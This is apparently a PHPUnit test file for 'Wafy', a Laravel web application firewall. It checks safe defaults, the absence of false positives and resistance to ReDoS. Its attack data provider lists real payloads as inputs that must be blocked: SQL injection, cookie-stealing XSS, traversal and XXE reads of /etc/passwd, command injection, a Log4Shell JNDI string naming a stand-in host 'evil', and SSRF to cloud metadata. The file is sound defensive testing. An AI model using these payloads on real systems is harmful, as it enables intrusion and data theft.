<?php

namespace Bdsa\Wafy\Tests\Unit;

use Bdsa\Wafy\Tests\TestCase;
use Bdsa\Wafy\Middleware\DetectMaliciousRequests;
use Bdsa\Wafy\Middleware\BlockBannedIp;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use Illuminate\Http\UploadedFile;

/**
 * Production-readiness gate: verifies the safety invariants that must hold before
 * shipping Wafy — safe shipped defaults, zero false positives on realistic
 * legitimate traffic, real attacks blocked, fail-safe robustness, and BC.
 */
class ProductionReadinessTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        Route::middleware(DetectMaliciousRequests::class)->any('/app', fn () => 'OK');
        Route::middleware(BlockBannedIp::class)->get('/block', fn () => 'OK');
    }

    /** The raw shipped config (env() falls back to defaults; no WAFY_* vars set). */
    private function shipped(): array
    {
        return require __DIR__ . '/../../config/wafy.php';
    }

    // ─────────────────────────── Safe shipped defaults ───────────────────────────

    /** @test */
    public function risky_features_are_all_off_by_default()
    {
        $c = $this->shipped();

        // Detection/response defaults must be conservative out of the box.
        $this->assertSame('block', $c['action']);
        $this->assertSame('json', $c['response']['mode']);
        $this->assertSame(0, (int) $c['response']['tarpit_seconds']);
        $this->assertFalse((bool) $c['geoip']['enabled'], 'geoip must be opt-in');
        $this->assertFalse((bool) $c['stats']['enabled'], 'stats must be opt-in');
        $this->assertFalse((bool) $c['rate_limit']['enabled'], 'rate limit must be opt-in');
        $this->assertFalse((bool) $c['multipart']['scan_file_contents'], 'content scan must be opt-in');
        $this->assertFalse((bool) $c['flag_empty_user_agent'], 'empty-UA flag must be opt-in');
        $this->assertSame([], $c['rule_packs'], 'CRS pack must be opt-in');
        $this->assertFalse((bool) $c['notifications']['enabled'], 'notifications opt-in');
    }

    /** @test */
    public function anti_self_dos_and_anti_false_positive_defaults_hold()
    {
        $c = $this->shipped();

        // A single false positive must not lock out a shared IP.
        $this->assertGreaterThanOrEqual(3, (int) $c['ban_threshold']);
        // Never ban a proxy/private IP unless explicitly acknowledged.
        $this->assertFalse((bool) $c['ban_private_ips']);
        // Never take the app down when the ban store hiccups.
        $this->assertTrue((bool) $c['fail_open']);
    }

    /** @test */
    public function every_shipped_rule_is_a_valid_regex()
    {
        foreach ($this->shipped()['rules'] as $rule) {
            $pattern = is_array($rule) ? ($rule['pattern'] ?? null) : $rule;
            $this->assertNotNull($pattern);
            $this->assertNotFalse(@preg_match($pattern, 'probe'), 'invalid regex: ' . $pattern);
        }
    }

    /** @test */
    public function every_bundled_pack_rule_is_a_valid_regex()
    {
        foreach (require __DIR__ . '/../../resources/rules/owasp-crs.php' as $rule) {
            $this->assertNotFalse(@preg_match($rule['pattern'], 'probe'), 'invalid pack regex: ' . $rule['pattern']);
            $this->assertLessThanOrEqual(3, $rule['score'], 'pack rules must stay conservative (<=3)');
        }
    }

    /** @test */
    public function no_rule_exhibits_catastrophic_backtracking()
    {
        $cfg = $this->shipped();
        $rules = $cfg['rules'];
        foreach (require __DIR__ . '/../../resources/rules/owasp-crs.php' as $r) {
            $rules[] = $r;
        }
        $max = (int) $cfg['max_scan_length'];
        $adversarial = [
            str_repeat('{', $max),
            str_repeat('{{', (int) ($max / 2)),
            str_repeat('<', $max),
            str_repeat('../', (int) ($max / 3)),
            str_repeat("'", $max),
            str_repeat('union select ', (int) ($max / 13)),
        ];

        foreach ($rules as $rule) {
            $pattern = is_array($rule) ? $rule['pattern'] : $rule;
            $id = is_array($rule) ? ($rule['id'] ?? '?') : $pattern;
            foreach ($adversarial as $input) {
                $start = microtime(true);
                @preg_match($pattern, $input);
                $this->assertLessThan(0.1, microtime(true) - $start, "possible ReDoS in rule {$id}");
            }
        }
    }

    /** @test */
    public function the_schema_is_in_place()
    {
        $this->assertTrue(Schema::hasTable('wafy_banned_ips'));
        $this->assertTrue(Schema::hasColumn('wafy_banned_ips', 'offense_count'));
        $this->assertTrue(Schema::hasTable('wafy_events'));
    }

    // ─────────────────────────── Zero false positives ───────────────────────────

    /**
     * @test
     * @dataProvider legitimateTraffic
     */
    public function legitimate_traffic_is_never_blocked(string $method, string $uri, array $body, array $headers = [])
    {
        $response = $this->call($method, $uri, $body, [], [], $this->transformHeadersToServerVars($headers));

        $response->assertStatus(200);
        $this->assertDatabaseMissing('wafy_banned_ips', ['ip_address' => '127.0.0.1']);
    }

    public static function legitimateTraffic(): array
    {
        $chrome = ['User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'];

        return [
            'home page'            => ['GET', '/app', [], $chrome],
            'search query'         => ['GET', '/app?q=' . urlencode('best laptop under 1000 from our store'), [], $chrome],
            'pagination'           => ['GET', '/app?page=3&sort=price&order=desc', [], $chrome],
            'Googlebot'            => ['GET', '/app', [], ['User-Agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)']],
            'legit curl API'       => ['GET', '/app?id=42', [], ['User-Agent' => 'curl/8.4.0']],
            'contact form'         => ['POST', '/app', ['name' => 'Jean Dupont', 'message' => "Bonjour,\nJe voudrais commander un produit de votre catalogue.\nMerci d'avance,\n-- \nJean"], $chrome],
            'login'                => ['POST', '/app', ['email' => 'user@example.com', 'password' => 'S3cret-P@ss!'], $chrome],
            'crypto wallet'        => ['POST', '/app', ['wallet' => '0x71C7656EC7ab88b098defB751B7401B5f6d8976F'], $chrome],
            'hex id'               => ['GET', '/app?ref=0xA1B2C3D4', [], $chrome],
            'book title'           => ['POST', '/app', ['title' => 'JavaScript: The Good Parts'], $chrome],
            'css paste'            => ['POST', '/app', ['css' => '/*! theme */ .box{color:red} /* end */'], $chrome],
            'js snippet'           => ['POST', '/app', ['code' => 'const s = `${user.name} <${user.email}>`; // build'], $chrome],
            'vue template doc'     => ['POST', '/app', ['doc' => 'Use {{ user.name }} and {{ config }} in your template']],
            'html5 doctype'        => ['POST', '/app', ['html' => '<!DOCTYPE html><p>Hello</p>']],
            'shell var prose'      => ['POST', '/app', ['msg' => 'the total is ${price} and settings look fine']],
            'math prose'           => ['POST', '/app', ['note' => 'if 2 and 3 = 5 then it works; a and b = c']],
            'filter expression'    => ['POST', '/app', ['q' => "status='active' or type='vip'"]],
            'ampersand & words'    => ['POST', '/app', ['c' => 'R&D on black & white cat food and dog food']],
            'section prose'        => ['POST', '/app', ['c' => 'See section 3.Environment and /var/log discussion']],
            'JSON api payload'     => ['POST', '/app', ['user' => ['name' => 'Ana', 'roles' => ['admin', 'editor']], 'ne' => 'value']],
            'scanner name in text' => ['POST', '/app', ['comment' => 'I ran sqlmap and nikto on my own test box last week']],
        ];
    }

    /** @test */
    public function a_legitimate_image_upload_is_not_blocked()
    {
        $file = UploadedFile::fake()->create('photo.jpg', 200, 'image/jpeg');

        $this->post('/app', ['avatar' => $file])->assertStatus(200);
        $this->assertDatabaseMissing('wafy_banned_ips', ['ip_address' => '127.0.0.1']);
    }

    // ─────────────────────────── Real attacks are blocked ───────────────────────────

    /**
     * @test
     * @dataProvider attackTraffic
     */
    public function real_attacks_are_blocked(string $method, string $uri, array $body)
    {
        $this->call($method, $uri, $body)->assertStatus(403);
    }

    public static function attackTraffic(): array
    {
        return [
            'sqli union'      => ['GET', '/app?q=' . urlencode('UNION SELECT username,password FROM users'), []],
            'sqli tautology'  => ['POST', '/app', ['u' => "admin' OR '1'='1"]],
            'sqli comment'    => ['POST', '/app', ['u' => "admin'--"]],
            'sqli ddl'        => ['GET', '/app?x=' . urlencode("1'; DROP TABLE users;--"), []],
            'xss script'      => ['POST', '/app', ['c' => '<script>alert(document.cookie)</script>']],
            'xss handler'     => ['POST', '/app', ['c' => '<details open ontoggle=alert(1)>']],
            'lfi traversal'   => ['GET', '/app?file=' . urlencode('../../../../etc/passwd'), []],
            'rce cmd'         => ['GET', '/app?x=' . urlencode(';id'), []],
            'rce php'         => ['POST', '/app', ['x' => 'system("id")']],
            'ssti el'         => ['POST', '/app', ['x' => '${T(java.lang.Runtime).getRuntime().exec("id")}']],
            'log4shell'       => ['POST', '/app', ['h' => '${jndi:ldap://evil/a}']],
            'ssrf metadata'   => ['GET', '/app?url=' . urlencode('http://169.254.169.254/latest/meta-data/'), []],
            'nosql operator'  => ['POST', '/app', ['user' => ['$ne' => 'x']]],
            'xxe entity'      => ['POST', '/app', ['xml' => '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>']],
            'java deser'      => ['POST', '/app', ['s' => 'rO0ABXNyABFqYXZhLnV0aWwu']],
        ];
    }

    /** @test */
    public function a_known_scanner_user_agent_is_blocked()
    {
        $this->call('GET', '/app', [], [], [], $this->transformHeadersToServerVars(['User-Agent' => 'sqlmap/1.7.2#stable']))
            ->assertStatus(403);
    }

    // ─────────────────────────── Robustness / fail-safe ───────────────────────────

    /** @test */
    public function it_fails_open_when_the_ban_store_is_unavailable()
    {
        Schema::dropIfExists('wafy_banned_ips');

        // fail_open defaults to true -> the app keeps serving.
        $this->get('/block')->assertStatus(200);
    }

    /** @test */
    public function it_can_fail_closed_when_explicitly_configured()
    {
        config(['wafy.fail_open' => false]);
        Schema::dropIfExists('wafy_banned_ips');

        $this->get('/block')->assertStatus(503);
    }

    /** @test */
    public function a_whitelisted_ip_bypasses_the_waf_entirely()
    {
        config(['wafy.allowed_ips' => ['127.0.0.0/24']]);

        $this->get('/app?q=' . urlencode('UNION SELECT 1'))->assertStatus(200);
        $this->assertDatabaseMissing('wafy_banned_ips', ['ip_address' => '127.0.0.1']);
    }

    /** @test */
    public function a_disabled_waf_passes_everything()
    {
        \Illuminate\Support\Facades\Cache::put('wafy.enabled', false);

        $this->get('/app?q=' . urlencode('UNION SELECT 1'))->assertStatus(200);
    }

    /** @test */
    public function a_private_proxy_ip_is_blocked_but_never_banned_by_default()
    {
        config(['wafy.ban_private_ips' => false]); // the shipped default

        $this->get('/app?q=' . urlencode('UNION SELECT 1'))->assertStatus(403);
        // The request is refused but the (proxy-looking) IP is NOT persisted.
        $this->assertDatabaseMissing('wafy_banned_ips', ['ip_address' => '127.0.0.1']);
    }

    // ─────────────────────────── Commands & BC ───────────────────────────

    /** @test */
    public function all_management_commands_run_without_fatal()
    {
        $this->artisan('wafy:list')->assertExitCode(0);
        $this->artisan('wafy:ban', ['ip' => '203.0.113.9'])->assertExitCode(0);
        $this->artisan('wafy:unban', ['ip' => '203.0.113.9'])->assertExitCode(0);
        $this->artisan('wafy:mode', ['status' => 'enable'])->assertExitCode(0);
        $this->artisan('wafy:action', ['action' => 'block'])->assertExitCode(0);
        $this->artisan('wafy:prune')->assertExitCode(0);
        $this->artisan('wafy:rule list')->assertExitCode(0);
        $this->artisan('wafy:stats')->assertExitCode(0);
    }

    /** @test */
    public function a_legacy_flat_patterns_config_still_works()
    {
        // A config published before the scoring engine (flat regex list).
        config(['wafy.rules' => [], 'wafy.patterns' => ['/(union(\s+all)?\s+select)/i', '/(<script.*?>.*?<\/script>)/is']]);

        // Benign first (a 200 leaves no ban to contaminate the next request).
        $this->postJson('/app', ['c' => 'plain harmless comment'])->assertStatus(200);
        $this->get('/app?q=' . urlencode('UNION SELECT 1'))->assertStatus(403);
    }
}
